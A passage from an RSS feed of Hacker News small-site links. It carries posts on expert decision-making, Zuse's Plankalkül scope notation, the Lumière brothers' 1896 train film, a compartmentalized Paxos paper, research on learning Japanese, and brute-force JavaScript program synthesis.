anything. There are no signs of smoke anywhere. He finds the door to the basement, around the side of the building, enters, and sees flames spreading up the laundry chute. That’s simple: a vertical fire that will spread straight up. Since there are no external signs of smoke, it must just be starting.<p>The way to fight a vertical fire is to get above it and spray water down, so he sends one crew up to the first floor and another to the second floor. Both report that the fire has gotten past them. The commander goes outside and walks around to the front of the building. Now he can see smoke coming out from under the eaves of the roof. It is obvious what has happened: the fire has gone straight up to the fourth floor, has hit the ceiling there, and is pushing smoke down the hall. Since there was no smoke when he arrived just a minute earlier, this must have just happened.</p><p>It is obvious to him how to proceed now that the chance to put out the fire quickly is gone. He needs to switch to search and rescue, to get everyone out of the building, and he calls in a second alarm. The side staircase near the laundry chute had been the focus of activity before. Now the attention shifts to the front stairway as the evacuation route.”</p></blockquote><p>Where were the decisions here? The firefighter sees a situation — a vertical fire — and immediately knows what to do. But a few seconds later, he cancels that diagnosis because he recognises a different situation, and orders a different set of actions.</p><p>In rational choice theory, the firefighter is not making any decisions at all because he is not comparing between possibilities. He is simply reading the environment and taking action. Klein and co argue that decisions are still made, however: at multiple points in the story, the firefighter could have chosen from an array of options. The fact that he merely considers one option at each decision point doesn’t mean he <em>didn’t</em> make a decision — it is simply that he considers his options in linear fashion, finds the first that is satisfactory, and then acts on it.</p><p>There are two conclusions from looking at this process. The first is to conclude that when we make decisions, we naturally <em>look at our options one at a time.</em> It just so happens that the first option an expert practitioner generates is …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://commoncog.com/blog/putting-mental-models-to-practice/">https://commoncog.com/blog/putting-mental-models-to-practice/</a></em></p>]]>
            </description>
            <link>https://commoncog.com/blog/putting-mental-models-to-practice/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705441</guid>
            <pubDate>Sat, 09 Jan 2021 22:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blocks Courtesy of Konrad Zuse (2014)]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25705391">thread link</a>) | @Tomte
<br/>
January 9, 2021 | https://blog.infinitenegativeutility.com/2014/9/blocks-courtesy-of-konrad-zuse | <a href="https://web.archive.org/web/*/https://blog.infinitenegativeutility.com/2014/9/blocks-courtesy-of-konrad-zuse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Apparently, I've got a theme going of Weird Syntax. Let's run with it.</p>

<p>Konrad Zuse was an early pioneer in computer science, although his name is perhaps somewhat less well-known than others. Zuse holds the honor of having built the first programmable computer—-the Z3—-back in the 40's, as well as several other computing firsts<sup id="fnref:1"><a href="#fn:1" rel="nofollow">1</a></sup>. Of particular interest to this blog post is his early unimplemented programming language, Plankalkül.</p>

<p>Plankalkül was, like the Z3, in many respects ahead of its time. Zuse's explicit goal was to be able to describe programs at a high level, which meant he included control structures and datatype definitions<sup id="fnref:2"><a href="#fn:2" rel="nofollow">2</a></sup> and other high-level constructs that were often missing in languages of the early years of computing. Zuse was working on Plankalkül at a time when his machines were not useable, which meant that his language work was more theoretical than it was technical, and consequently he allowed features that he wasn't entirely sure how to program. Despite his notes on it having been written in the mid-40's, they were not published until the 70's, and it was not implemented until the year 2000.</p>

<p>One thing that struck me, as I read programs in this notation that had been set down on a typewriter<sup id="fnref:3"><a href="#fn:3" rel="nofollow">3</a></sup>, is that certain kinds of grouping were handled by explicit indication of scope: not via matched delimiters as in ALGOL-style languages, or via indentation in languages such as Python and Haskell, but by formatting the code so that a line bordered on the left of the scoped parts of the code:</p>

<p><img src="https://blog.infinitenegativeutility.com/static/zuse-01.png" alt=""></p>

<p>This is meant to capture the way grouping works in the hand-written or typeset notation, with brackets spanning multiple lines:</p>

<p><img src="https://blog.infinitenegativeutility.com/static/zuse-02.png" alt=""></p>

<p>I think this is notationally interesting: it's like Python's significant whitespace, but not, uh, whitespace. It would be incredibly tedious to type out, but still entirely compatible with current programming notation:</p>

<pre><code>class Tet
 | @staticmethod
 | def new_tet()
 |  | n = randint(0, len(Tet.Tets) - 1)
 |  | for p in Tet.Tets[n]
 |  |  | if p in Board.permanent
 |  |  |  | Game.lose()
 |  | Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 |
 | def __init__(self, points, color)
 |  | self.points = points
 |  | self.color = color
</code></pre>

<p>and would be entirely amenable to beautifying via judicious application of Unicode:</p>

<pre><code>class Tet
 ┃ @staticmethod
 ┃ def new_tet()
 ┃  ┃ n = randint(0, len(Tet.Tets) - 1)
 ┃  ┃ for p in Tet.Tets[n]
 ┃  ┃  ┃ if p in Board.permanent
 ┃  ┃  ┗  ┗ Game.lose()
 ┃  ┗ Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 ┃
 ┃ def __init__(self, points, color)
 ┃  ┃ self.points = points
 ┃  ┗ self.color = color
</code></pre>

<p>Looking at this notation, however, an interesting possibility struck me: a programmer could explicit annotate information about the <em>kind of scope</em> involved in a given line. In this Python-like example, I could, for example, distinguish class scope using double lines, function scope with thick lines, and control structure scope with thin lines:</p>

<pre><code>class Tet
 ║ @staticmethod
 ║ def new_tet()
 ║  ┃ n = randint(0, len(Tet.Tets) - 1)
 ║  ┃ for p in Tet.Tets[n]
 ║  ┃  │ if p in Board.permanent
 ║  ┃  └  └ Game.lose()
 ║  ┗ Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 ║
 ║ def __init__(self, points, color)
 ║  ┃ self.points = points
 ║  ┗ self.color = color
</code></pre>

<p>One advantage of this scheme is that a handful of lines, viewed in isolation, still give you a clear view of what surrounds them. For example, I can view these two lines in isolation and still tell that they are within a control structure used within a function declared within a class:</p>

<pre><code> ║  ┃  │ if p in Board.permanent
 ║  ┃  └  └ Game.lose()
</code></pre>

<p>You could also imagine a hypothetical language in which choice of scope delimiter is important. In Python, <code>for</code> and <code>if</code> do not form a new lexical scope. What if instead we could stipulate the kind of scope they form by this notational convention?</p>

<pre><code>def okay()
 ┃ if True
 ┃  └ n = 5   # n is declared in function scope
 ┗ return n   # n leaks out of the if-scope

def not_okay()
 ┃ if True
 ┃  ┗ n = 5   # n is declared in the if's scope
 ┗ return n   # error: no n in scope here
</code></pre>

<p>That being said, there are a number of reasons that this notation is in inferior to existing notations:</p>
<ul><li>It makes refactoring code <em>much</em> more difficult.</li>
<li>It requires that the programmer <em>pay attention</em> to the sequence of enclosing scopes on a <em>line-by-line</em> basis, which is generally too pedantic and not particularly useful for a programmer.</li>
<li>The ability to select “which kind of scope” is by no means only expressible by this notation, as other syntactic features such as keywords and delimiters could express the same thing.</li>
<li>There are only so many line-like characters which can serve as a scope marker, so this scheme is not very extensible.</li>
<li>It complicates parsing (especially by introducing an entirely new class of parse errors in which adjacent lines feature incompatible sequences of delimiting lines), and so it also...</li>
<li>Complicates parse <em>error messages</em>, which are an important part of a language's UI and should be considered seriously.</li></ul>

<p>So, as in my previous post on <a href="https://blog.infinitenegativeutility.com/2014/8/noun-case" rel="nofollow">grammatical case in programming languages</a>, I urge readers <em>not</em> to use this notation as the concrete syntax for a programming language. This is merely an entertaining peek through the looking glass at a curious notational convention which was never adopted.</p>

<p>That said: this makes a very nice notation for <em>viewing</em> code, where the programmer does not have to explicitly draw ASCII art around their code; indeed, it bears more than a passing similarity to the graphical interface used in <a href="http://scratch.mit.edu/" rel="nofollow">Scratch</a>, and Sean McDirmid's <a href="http://research.microsoft.com/en-us/projects/liveprogramming/typography.aspx" rel="nofollow">Experiments in Code Typography</a> features this very convention as an interactive ornament on code in a Python-like language.</p>

</div></div>]]>
            </description>
            <link>https://blog.infinitenegativeutility.com/2014/9/blocks-courtesy-of-konrad-zuse</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705391</guid>
            <pubDate>Sat, 09 Jan 2021 22:08:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Movie in the World]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25705332">thread link</a>) | @Lindaz
<br/>
January 9, 2021 | http://www.the-classic-movies.com/the-arrival-of-a-train-1896/ | <a href="https://web.archive.org/web/*/http://www.the-classic-movies.com/the-arrival-of-a-train-1896/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h2>The Arrival of a Train</h2>

<p>Release date: January 25, 1896<br>
Directed by: Auguste Lumière, Louis Lumière<br>
Stars: Madeleine Koehler, Marcel Koehler, Mrs. Auguste Lumiere, etc.<br>
Running time: 50 seconds<br>
Country: France<br>
Language: Silent</p>
<p><img loading="lazy" src="http://www.the-classic-movies.com/wp-content/uploads/2021/01/The-Arrival-of-a-Train-1896-200x300.jpg" alt="The-Arrival-of-a-Train-(1896)" width="200" height="300" srcset="https://www.the-classic-movies.com/wp-content/uploads/2021/01/The-Arrival-of-a-Train-1896-200x300.jpg 200w, https://www.the-classic-movies.com/wp-content/uploads/2021/01/The-Arrival-of-a-Train-1896.jpg 350w" sizes="(max-width: 200px) 100vw, 200px"></p>
<p>There is nothing exciting about an arriving train, but somehow it became an iconic scene in cinematic history. Produced by pioneering French filmmakers Auguste and Louis Lumière, it was the first scene that was ever shown to public. Arrival of a Train at La Ciotat was filmed in France at the end of 1895 and was shown in 1896. The 50-second long film captures the gradual approach of a train, its slow stop and the disembarking of its passengers. The arrival of a train produces little of interest in terms of actual content but it has more of interest in its historical and cultural context.</p>
<p>It is interesting that this scene, that is really simple and casual for us today, made a great affect on people, they said it was all realistic and it was a great power of illusion. Almost everyone heard the story about people who was watching that scene for the first time back then in 1896, they was scared and ran out. In fact, there was no real mass panic. But French scientist Henri de Parville, who attended an early screening, wrote: «One of my neighbors was so much captivated that she sprung to her feet… and waited until the car disappeared before she sat down again.» It shows us that it was a miracle alive for people back then and it is hard to imagine what they were felling during the screening of «The arrival of a train» in January, 1896.</p>
<p>Auguste and Louis Lumière obviously recognized the power of illusion that they had. In order to maximize the affect of the approaching train they mounted their camera as close as possible to the edge of platform, so that the audience feels as if they stand right on the locomotive’s path. People in the scene are just normal citizens that stand on the platform, so it makes us believe that all of that is real. So since we have nothing in common with the first audiences, we may understand that it was something magical for people back then.</p>
<p>Moreover, this scene makes a great affect today, but not as a cinematic miracle, but as a history. On a surface level we watch a train arrives but what we are really witnessing is the arrival of cinema. Nowadays we understand what cinematography is and, in fact, it is not a film in our today comprehension, but it is always interesting to see how it all started and to trace its development.</p>
<p>«The arrival of a train» is not just a short scene or a film, but it is a window between past and present. It is a possibility to see what people looked like, because photos and pictures are good things, but when we look at this scene we feel that we are with that people, that they are alive and we understand what they were wearing in those days, we can see their appearance.</p>
<p>Summing up, we can say that Auguste and Louis Lumière weren’t really artists. Their early films don’t stand up to the highly imaginative movies of George Méliès for example. But they still remain very important cinema giants. Not for the content of their films but for the fact that they kicked things off in the first place and produced the first iconic moment in cinema history. And for this reason «L’arrivée d’un train a La Ciotat» will always be remembered. Everyone who has a love of cinema should really take a minute of their time to pay attention to the first moment in an amazing thing called cinematography.</p>


</div></div>]]>
            </description>
            <link>http://www.the-classic-movies.com/the-arrival-of-a-train-1896/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705332</guid>
            <pubDate>Sat, 09 Jan 2021 22:04:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scaling Replicated State Machines with Compartmentalization]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25705234">thread link</a>) | @cpufry
<br/>
January 9, 2021 | https://mwhittaker.github.io/publications/compartmentalized_paxos.html | <a href="https://web.archive.org/web/*/https://mwhittaker.github.io/publications/compartmentalized_paxos.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
    <center>
      
    </center>

    <p><span>
      <a href="https://mwhittaker.github.io/publications/compartmentalized_paxos.pdf">
        "Scaling Replicated State Machines with Compartmentalization"
      </a>
    </span>
    <span>
      Michael Whittaker,
      Ailidani Ailijiang,
      Aleksey Charapko,
      Murat Demirbas,
      Neil Giridharan,
      Joseph M. Hellerstein,
      Heidi Howard,
      Ion Stoica,
      Adriana Szekeres
    </span></p><h2>Links</h2>
    <ul>
      <li>
        <a href="https://mwhittaker.github.io/publications/compartmentalized_paxos.pdf">A pre-print of the paper</a>
      </li>
      <li>
        <a href="https://arxiv.org/abs/2012.15762">The technical report on arXiv</a>
      </li>
      <li>
        <a href="https://github.com/mwhittaker/frankenpaxos">The source code on GitHub</a>
      </li>
      <li>
        <a href="https://mwhittaker.github.io/frankenpaxos/js/src/main/js/multipaxos/multipaxos.html">A JavaScript visualization of Compartmentalized MultiPaxos</a>
      </li>
      <li>
        <a href="https://mwhittaker.github.io/">More publications on similar topics</a>
      </li>
    </ul>

    <h2>Abstract</h2>
    <p>
    State machine replication protocols, like MultiPaxos and Raft, are a
    critical component of many distributed systems and databases. However,
    these protocols offer relatively low throughput due to several bottlenecked
    components. Numerous existing protocols fix different bottlenecks in
    isolation but fall short of a complete solution. When you fix one
    bottleneck, another arises. In this paper, we introduce
    compartmentalization, the first comprehensive technique to eliminate state
    machine replication bottlenecks. Compartmentalization involves decoupling
    individual bottlenecks into distinct components and scaling these
    components independently. Compartmentalization has two key strengths.
    First, compartmentalization leads to strong performance. In this paper, we
    demonstrate how to compartmentalize MultiPaxos to increase its throughput
    by 6x on a write-only workload and 16x on a mixed read-write workload.
    Unlike other approaches, we achieve this performance without the need for
    specialized hardware. Second, compartmentalization is a technique, not a
    protocol. Industry practitioners can apply compartmentalization to their
    protocols incrementally without having to adopt a completely new protocol.
    </p>
  </div></div>]]>
            </description>
            <link>https://mwhittaker.github.io/publications/compartmentalized_paxos.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705234</guid>
            <pubDate>Sat, 09 Jan 2021 21:54:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Research-Based Methods for Learning Japanese]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25705070">thread link</a>) | @sova
<br/>
January 9, 2021 | https://japanesecomplete.com/articles/?p=1282 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/articles/?p=1282">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<h3><strong>Conclusions</strong> from the Academic Research</h3>



<p>We looked at research papers from the last 30 years to evaluate our set of teaching strategies undertaken in our Japanese language learning application called <a href="https://japanesecomplete.com/">Japanese Complete</a>.  We found that the scholarly and academic studies referred to confirm:</p>



<ol><li><strong>Kanji [logographs of mainland Asian origin] are categorized as the main impediment in acquisition of the Japanese language</strong> and anything to ease their acquisition from rote-memorization will help learners greatly.</li><li><strong>Computer aided learning of Japanese is superior to textbook-based</strong> learning <strong>when</strong> <strong>paired with timely and useful feedback</strong> for the learner, with politeness language, grammar, kanji, and more. [4, 5, 7, 12, 17]</li><li><strong>Kanji are processed by different parts of the brain compared to English letters and Hiragana mora,</strong> suggesting that placing special emphasis on learning Kanji as glyphs or <em>graphics with associated meanings <strong>first</strong></em> establishes a firm foundation upon which to then learn readings and pronunciations. [2, 6]</li><li>Kanji have <em>logographic</em> as well as <em>phonographic</em> value; <strong>cultural, etymological, and mnemonic strategies are not only more effective than rote-memorization strategies for learning, they also remove a lot of anxiety and perceived inscrutability of kanji, making kanji learning fun and intriguing</strong> instead of a chore.  The main techniques presented in these papers include component-analysis of kanji [what we call subkanji learning], and pairing kanji with graphical and mnemonic aides such as stories or imaginal scenes. [6, 7, 10, 11, 14, 15]</li><li>It is very likely that native speakers of languages featuring kanji create <em>some sort</em> of meaning-word associated with each kanji, whether able to give voice to it or not (“unconscious knowledge”), suggesting strongly that <strong>by teaching kanji meaning-words first one is creating a very helpful and direct shortcut to their successful assimilation.</strong> [6, 9, 10]</li><li>One paper suggests the use of an “orthographic gradient” where terms are first shown as color-coded Hiragana, and later instances are shown as color-coded kanji using the same coloration, allowing learners to make an implied association of equality.  <strong>This idea of “orthographic gradient” confirms the efficacy of our innovative approach “Kanji in English Context” where we t取ke kanji and pl置ce them in an 英ngl語sh c文nt脈xt [take, place, English, context] to expedite acquisition</strong> and increase familiarity with the plurality of [English] words kanji can represent. [11, 16]</li><li><strong>Acquisition of Japanese grammar and sequence continues to be the most challenging part of learning the language for 1st, 2nd, and 3rd year students,</strong> suggesting that the focus for the first several semesters of learning ought be grammar-focused.  Nouns are acquired at a linear rate no matter the level of grammar competency, and thus it would suggest that the learning of nouns can actually be greatly delayed without any negative impact on comprehension; rather, focus on grammar first would result in greatly improved comprehension when nouns are later added to one’s cogent grammar understanding. </li><li><strong>Very Accurate Japanese Pitch Accent</strong> can be trained and learned swiftly with the right learning materials (showing pitch contours on screen and having learners listen and repeat). [17]</li><li><strong>One’s native language shapes how one acquires second+ languages.</strong> [3, 13]</li></ol>



<figure><img src="http://jpc0.b-cdn.net/img/lake-onami.jpg" alt=""><figcaption>Lake Onami</figcaption></figure>



<h3><br><strong>Scholarly and Academic Works Cited</strong></h3>



<hr>



<p>[1] <em><strong>Phonological processing of Japanese Kanji and Chinese characters in bilingual Japanese : An fMRI study (2017)</strong></em></p>



<p><a href="https://ieeexplore.ieee.org/document/8015970" target="_blank" rel="noreferrer noopener">https://ieeexplore.ieee.org/document/8015970</a></p>



<p>“The result showed that our bilingual Japanese subjects have large overlaps in the neural substrates for phonological processing of both native and second language.  Our finding supports the idea that the neural systems of second language reading are shaped by native language.” </p>



<hr>



<p>[2] <em><strong>Japanese and English sentence reading comprehension and writing systems: An fMRI study of first and second language effects on brain activation. (2009)</strong></em></p>



<p><a href="https://pubmed.ncbi.nlm.nih.gov/19946611/" target="_blank" rel="noreferrer noopener">https://pubmed.ncbi.nlm.nih.gov/19946611/</a></p>



<p>Parts of the brain that are engaged when native Japanese readers process English, Hiragana, and Kanji:</p>



<figure><img src="https://www.ncbi.nlm.nih.gov/pmc/articles/instance/2782536/bin/nihms120575f4.jpg" alt=""><figcaption>Activation regions for native Japanese speakers decoding written language.</figcaption></figure>



<p>“Functional magnetic resonance imaging (fMRI) was used to compare brain activation from Japanese readers reading hiragana (syllabic) and kanji (logographic) sentences, and English as a second language (L2). Kanji showed more activation than hiragana in right-hemisphere occipito-temporal lobe areas associated with visuospatial processing; hiragana, in turn, showed more activation than kanji in areas of the brain associated with phonological processing. L1 results underscore the difference in visuospatial and phonological processing demands between the systems. Reading in English as compared to either of the Japanese systems showed more activation in inferior frontal gyrus, medial frontal gyrus, and angular gyrus. The additional activation in English in these areas may have been associated with an increased cognitive demand for phonological processing and verbal working memory.”</p>



<hr>



<p>[3] <em><strong>Comparative Spatial Semantics and Language Acquisition:Evidence from Danish, English, and Japanese (1994)</strong></em></p>



<p><a href="https://www.researchgate.net/profile/Chris-Sinha/publication/249234936_Comparative_Spatial_Semantics_and_Language_Acquisition_Evidence_from_Danish_English_and_Japanese/links/57da79a508ae72d72ea2b8b8/Comparative-Spatial-Semantics-and-Language-Acquisition-Evidence-from-Danish-English-and-Japanese.pdf" target="_blank" rel="noreferrer noopener">https://www.researchgate.net/profile/Chris-Sinha/publication/249234936_Comparative_Spatial_Semantics_and_Language_Acquisition_Evidence_from_Danish_English_and_Japanese/links/57da79a508ae72d72ea2b8b8/Comparative-Spatial-Semantics-and-Language-Acquisition-Evidence-from-Danish-English-and-Japanese.pdf</a></p>



<p>“Perhaps the most important finding is that in all three languages that we have analysed acquisition appears to take place in two phases, during the first of which the child gradually acquires six to eight simple forms corresponding to ‘basic’ spatial meanings encoded in the target language.”</p>



<p>“In the second phase of acquisition, the child’s productive repertoire and the frequency of its use increase in a way that is reminiscent of (though perhaps less dramatic than) the ‘vocabulary explosion’ in nominal usage. The extension of the repertoire takes different courses, depending on the structure of the target language. In all languages it can be expected that the repertoire within the form class which is dominant in expressing spatial relational meaning will continue to expand, and that this will remain the most frequently employed vehicle for the child’s expression of spatial relational meaning throughout and perhaps beyond the third year of life.”</p>



<p>“In languages, such as Japanese, in which spatial relational meaning is overtly distributed over different form classes, the second phase will involve both an increase in the range of types controlled in the dominant form class (in this case,verbs), and the extension of the acquisition process to the other form classes (in this case, particles and nouns). Both the slow pace of acquisition in the non-dominant forms classes, and the fact that the meanings initially expressed using nouns are cognate with those already expressed using verbs, suggest that, in Japanese too, the learning process continues to be governed in the second phase by a conservative strategy. It can perhaps be seen as follows: the child employs the already acquired meanings as clues for the establishment of new centres in new form classes for the repetition with respect to these new form classes of the radial strategy already successfully employed with respect to the dominant form class.”</p>



<hr>



<p>[4] <strong><em>Supporting the acquisition of Japanese polite expressions in context-aware ubiquitous learning</em> <em>(2010)</em></strong></p>



<p><a href="http://www.academia.edu/download/50315553/ijmlo.2010.03263720161114-19604-1c5exmp.pdf">http://www.academia.edu/download/50315553/ijmlo.2010.03263720161114-19604-1c5exmp.pdf</a></p>



<p>“To support the foreigners learning JPE [Japanese Politeness Expressions], a PDA-based context-aware language learning support environment was proposed. This environment supports the learners to learn JPE according to the different situations in the real world. There are two version of the prototype system for this environment. In this paper, design, implementation and evaluation of JAPELAS2 are presented. From the experiment, we found the system provides the correct polite-expression based on hyponymy, social distance and situation through the identification of the target user and the location. The experiment showed that the system was quite useful and using this system made understanding the appropriate level of politeness easy by changing roles and situations.”</p>



<figure><img loading="lazy" width="645" height="641" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/Screen-Shot-2021-01-06-at-4.13.32-PM.png" alt=""></figure>



<hr>



<p>[5] <em><strong>COMPUTER VS. WORKBOOK INSTRUCTION IN SECOND LANGUAGE ACQUISITION (1996)</strong></em></p>



<p><a href="https://journals.equinoxpub.com/CALICO/article/viewFile/23393/19398">https://journals.equinoxpub.com/CALICO/article/viewFile/23393/19398</a></p>



<p>“The results of the study show that given the same grammar notes and exercises, <strong>ongoing intelligent computer feedback is more effective than simple workbook answer sheets for developing learners’ grammatical skill in producing Japanese particles and sentences.</strong> A significant difference between Nihongo-CALI and the workbook instruction was observed in the production tests but not in the comprehension tests. This is consistent with Flynn’s hypothesis that grammatical competence is less critical in comprehension than in production. As suggested by Pederson and Dunkel, the present study also confirms that the use of a medium (i.e., computer) alone does not bring better effects; rather the quality of the messages produced by the medium affects the result. This is based on the fact that the intelligent version of Nihongo-CALI is significantly more effective than the workbook instruction”</p>



<div><figure><img loading="lazy" width="411" height="333" src="https://japanesecomplete.com/articles/wp-content/uploads/2021/01/Screen-Shot-2021-01-06-at-4.19.44-PM.png" alt=""></figure></div>



<hr>



<p>[6] <em><strong>L2 learners’ attitudes toward, and use of, mnemonic strategies when learning Japanese Kanji (2013)</strong></em></p>



<p><a href="https://www.researchgate.net/publication/259551232_L2_learners%27_attitudes_toward_and_use_of_mnemonic_strategies_when_learning_Japanese_Kanji">https://www.researchgate.net/publication/259551232_L2_learners%27_attitudes_toward_and_use_of_mnemonic_strategies_when_learning_Japanese_Kanji</a></p>



<p>“This study investigated kanji learning (the memorization of Japanese written characters) of university students of Japanese, in order to evaluate students’ use of mnemonic strategies. The study applied …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://japanesecomplete.com/articles/?p=1282">https://japanesecomplete.com/articles/?p=1282</a></em></p>]]>
            </description>
            <link>https://japanesecomplete.com/articles/?p=1282</link>
            <guid isPermaLink="false">hacker-news-small-sites-25705070</guid>
            <pubDate>Sat, 09 Jan 2021 21:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: JavaScript Program Synthesis]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25705059">thread link</a>) | @coolvision
<br/>
January 9, 2021 | https://grgv.xyz/inductive_program_synthesis/ | <a href="https://web.archive.org/web/*/https://grgv.xyz/inductive_program_synthesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Any compiler or transpiler is doing some form of program synthesis. But “proper” program synthesis usually means generation of high level programs from scratch, given only high level problem descriptions.</p>
<p>This post is about one of the most simple and straightforward methods of automatic program synthesis: inductive synthesis based on <strong>input-output examples</strong> specification and <strong>brute-force enumerative</strong> search.</p>
<h3>Synthesis task specification</h3>
<p>Let's start with a simple example. Suppose that we want to automatically generate a program that reverses an array.</p>
<p>How to formulate this task for the automatic program generator? One option is to just describe it in natural language. But it would be quite hard to automatically parse and understand. A simpler way is to provide examples of inputs and expected outputs:</p>
<p>[1, 2, 3, 4, 5, 6] → [6, 5, 4, 3, 2, 1]</p>
<p>[5, 2, 7, 6] → [6, 7, 2, 5]</p>
<p>It's similar to a programmer working on a task using test-driven development, with a set of self-explanatory tescases.</p>
<h3>Brute-force search</h3>
<p>How to find a program that satisfies some input-output examples? There are several possible search strategies, but the simplest one is just with a brute force enumeration.</p>
<p>The idea is to generate all programs (within some size liimts and a limited language subset), and pick the first one that works correctly for all specified examples.</p>
<p>This is probably the least efficient approach of all, but with some additional optimizations and heuristics for reducing the search space it can actually be practical.</p>
<p>For example, an algorithm that won last year's synthesis competition <a href="https://sygus.org/comp/2019/">SyGuS-Comp 2019</a> in programming-by-examples track, is based on brute-force enumerative search strategy. As well as some previous years winners (<a href="#examples" id="ref1">EUSOLVER, Enumerative CEGIS Solver</a>). There are even some practical applications, for example brute-force search can be used for <a href="http://dl.acm.org/citation.cfm?id=2462174">synthesising distributed systems protocols</a>.</p>
<h3>Generating Javascript</h3>
<p>For generating and manipulating programs, code has to be represented as a data structure. This is not a problem in homoiconic languages like Lisp, but in Javascript it’s harder.</p>
<p>One simple idea (used, for example in miniMAL project <a href="https://github.com/kanaka/miniMAL">https://github.com/kanaka/miniMAL</a>), is to use JSON for representing programs. In this case, JSON arrays are serving as an analog of Lisp s-expressions.</p>
<p>Similar to an s-expression, each JavaScript expression is represented as a JSON array. First element is a function name, and the rest of elements are for function arguments.</p>
<p>For example:</p>
<table>
  <thead>
  <tr>
   <td><strong>Javascript</strong></td>
   <td><strong>JSON</strong></td>
  </tr>
  </thead>
  <tbody><tr>
   <td>Math.pow(x, 2)</td>
   <td>["Math.pow", "x", 2]</td>
  </tr>
  <tr>
   <td>Math.pow(Math.sin(x), 2)</td>
   <td>[“Math.pow”, [“Math.sin”,  “x”], 2]</td>
  </tr>
</tbody></table>
<p>For operators, can use prefix notation:</p>
<table>
  <tbody><tr>
   <td>x = 2 + 2</td>
   <td>["=", x, ["+", 2, 2]]</td>
  </tr>
</tbody></table>
<p>There are some special expressions formats: control flow, variables declaration.</p>
<table>
  <tbody><tr>
   <td><strong>Javascript</strong>
   </td>
   <td><strong>JSON</strong>
   </td>
  </tr>
  <tr>
   <td>let x = 1
   </td>
   <td> ["let", "x", 1]
   </td>
  </tr>
  <tr>
   <td>for (let i = 0; i &lt; 10; i += 1) { console.log(i) }
   </td>
   <td>["for”, ”i”, ”0”, ”10”, ”1”,["block", [“console.log”, “i”]]]
   </td>
  </tr>
  <tr>
   <td>if (i &gt; 1) { i = 1; }
   </td>
   <td>["if", [“&gt;“, “i”, 1], ["block", [“=“, “i”, 1]]]
   </td>
  </tr>
</tbody></table>
<p>Also need syntax conventions for calling methods, accessing properties, and indexing arrays:</p>
<table>
  <tbody><tr>
   <td>let a = new Array(0, 1, 2)
   </td>
   <td>["let", "a", ["new Array", 0, 1, 2]]
   </td>
  </tr>
  <tr>
   <td>a.shift()
   </td>
   <td>[".shift", "a"]
   </td>
  </tr>
  <tr>
   <td>let n1 = a.length
   </td>
   <td>["let",  "n1", [".length_", "a"]]
   </td>
  </tr>
  <tr>
   <td>let n2 = a[1]
   </td>
   <td>["let",  "n2", ["get_index", a, 1]
   </td>
  </tr>
  <tr>
   <td>a[1] = 2
   </td>
   <td>["set_index", a, 0, 0]
   </td>
  </tr>
</tbody></table>
<p>This allows to represent a wide range of possible JavaScript expressions, and covers all language features needed for a simple demo.</p>
<p>Code for transforming from JSON representation to Javascript is fairly simple. It just has to traverse arrays, print out expressions elements in correct order, and deal with code formatting.</p>
<h3>Simple DSL</h3>
<p>For brute-force search to be feasible, search space has to be limited to some restricted domain-specific language subset, which depends on the kind of the target problem.</p>
<p>For example, can design a simple DSL targeted for simple array processing. It should have functions for array access and manipulation, simple arithmetics, and control flow functions.</p>
<table>
  <tbody><tr>
   <td><strong>function</strong>
   </td>
   <td><strong>Javascript</strong>
   </td>
   <td><strong>JSON</strong>
   </td>
  </tr>
  <tr>
   <td>subtract
   </td>
   <td>number = number?? - number??
   </td>
   <td>["-", "number??", "number??", "number"]
   </td>
  </tr>
  <tr>
   <td>add
   </td>
   <td>number = number?? + number??
   </td>
   <td>["+", "number??", "number??", "number"]
   </td>
  </tr>
  <tr>
   <td>greater than
   </td>
   <td>boolean = number?? &gt; number??
   </td>
   <td>["&gt;", "number??", "number??", "boolean"]
   </td>
  </tr>
  <tr>
   <td>less than
   </td>
   <td>boolean = number?? &lt; number??
   </td>
   <td>["&lt;", "number??", "number??", "boolean"]
   </td>
  </tr>
  <tr>
   <td>equal
   </td>
   <td>boolean = number?? == number??
   </td>
   <td>["==", "number??", "number??", "boolean"]
   </td>
  </tr>
  <tr>
   <td>array length
   </td>
   <td>number = array??.length
   </td>
   <td>[".length_", "array??", "number"]
   </td>
  </tr>
  <tr>
   <td>get array element at index
   </td>
   <td>number = array??[number??]
   </td>
   <td>["get_index", "array??", "number??", "number"]
   </td>
  </tr>
  <tr>
   <td>set array element at index
   </td>
   <td>array??[number??] = number
   </td>
   <td>["set_index", "output", "number??", "number??", ""]
   </td>
  </tr>
  <tr>
   <td>for loop
   </td>
   <td>for (let i in array??) { ?? }
   </td>
   <td>["for", "i", ["block", "??"], "in", "array??", ""]
   </td>
  </tr>
  <tr>
   <td>If condition
   </td>
   <td>if (boolean??) { ?? }
   </td>
